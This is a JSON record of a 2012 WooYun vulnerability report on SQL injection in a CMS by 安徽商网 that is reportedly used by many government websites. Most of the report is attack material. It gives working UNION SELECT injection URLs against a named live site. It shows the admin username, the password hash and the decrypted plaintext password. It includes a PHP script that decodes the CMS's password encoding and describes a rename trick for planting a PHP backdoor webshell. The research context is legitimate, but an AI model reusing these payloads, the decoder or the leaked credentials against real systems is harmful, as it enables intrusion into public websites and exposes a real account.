{"id": 20391, "wybug_id": "wooyun-2012-06831", "wybug_title": "大量政府网站使用的安徽商网的建站系统存在sql注入(再续)", "wybug_corp": "安徽商网", "wybug_author": "安静", "wybug_date": "2012-05-08 21:58", "wybug_open_date": "2012-05-08 21:58", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "5", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "注射利用技巧", "算法破解", "安徽商网"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-05-08：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2012-05-08：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 老洞了,http://www.wooyun.org/bugs/wooyun-2010-04869   http://www.wooyun.org/bugs/wooyun-2010-05331    这cms应该是某个版本的注射不知道怎么没人发,估计日这cms的都碰到过吧.      详细说明：  不会说,看漏洞证明吧.亲.   漏洞证明：  随便找了个目标.http://jiuye.axhu.cn/include/web_content.php?id=8976+and+1=2+union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20+from+web_user 会直接跳转到  http://jiuye.axhu.cn/include/11   返回404.\n\n开始也以为注射不了,后来看URL,http://jiuye.axhu.cn/include/11    有个11..估计你们日的时候应该碰到过.  然后http://jiuye.axhu.cn/include/web_content.php?id=8976+and+1=2+union select 1,2,3,4,5,6,7,8,9,10,concat(0x285E,username,0x7C,password,0x5E29),12,13,14,15,16,17,18,19,20+from+web_user返回http://jiuye.axhu.cn/include/(%5Extgl%7C11161c3f4e4e4747%5E)   管理和密码暴出来了.\n\n解密出来明文为xtgl   nic@1188.\n\n贴个解密;\n<?phpfunction authcode($string,$operation='ENCODE') {\tif ($operation=='ENCODE'){\t\t$OutTxt = \"\";\t\tfor ($x=0;$x<strlen($string);$x++) {\t\t\t$nr = ord($string[$x]);\t\t\tif ($nr < 128) {\t\t\t\t$nr += 128;\t\t\t}\t\t\telseif ($nr > 127) {\t\t\t\t$nr -= 128;\t\t\t}\t\t\t$nr = 255 - $nr;\t\t\t$OutTxt .= sprintf(\"%02x\", $nr);\t\t}\t\treturn $OutTxt;\t}else{\t\t$OutTxt = \"\";\t\tfor ($x=0;$x<(strlen($string)/2);$x++) {\t\t\t$nr = hexdec($string[$x * 2] . $string[($x * 2) + 1]);\t\t\t$nr = 255 - $nr;\t\t\tif ($nr < 128) {\t\t\t\t$nr += 128;\t\t\t}\t\t\telseif ($nr > 127) {\t\t\t\t$nr -= 128;\t\t\t}\t\t\t$OutTxt .= chr($nr);\t\t}\t\treturn $OutTxt;\t}}if(isset($_GET[\"code\"])) echo authcode($_GET[\"code\"],\"x\");?>\n关于后台拿shell.   除了之前那些.在文件管理处可以新建比如内容为后门的x.txt   然后利用改名功能改成x.php.   后面有个点.  确认后,自动过滤最后的点,为x.php    PS:我好蛋疼.不知道怎么写.希望骗个邀请码.   修复方案：  我不会.   版权声明：转载请注明来源 安静@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：8 (WooYun评价)  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 8, "Ranks": null}